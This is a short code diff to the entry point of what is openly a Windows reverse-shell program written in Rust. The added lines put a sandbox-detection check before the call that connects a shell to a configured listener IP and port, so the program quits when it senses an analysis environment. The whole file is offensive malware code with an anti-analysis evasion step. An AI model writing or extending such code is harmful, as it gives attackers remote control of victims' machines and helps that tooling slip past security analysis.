@@ -11,5 +11,10 @@ mod rco_reverse_shell_windows;
 use rco_reverse_shell_windows::shell;
 
 fn main() {
+    // Runs the sandbox detection function or the dummy replacement, dependent on features
+    if rco_utils::pound_sand() {
+        return
+    }
+
     shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
 }
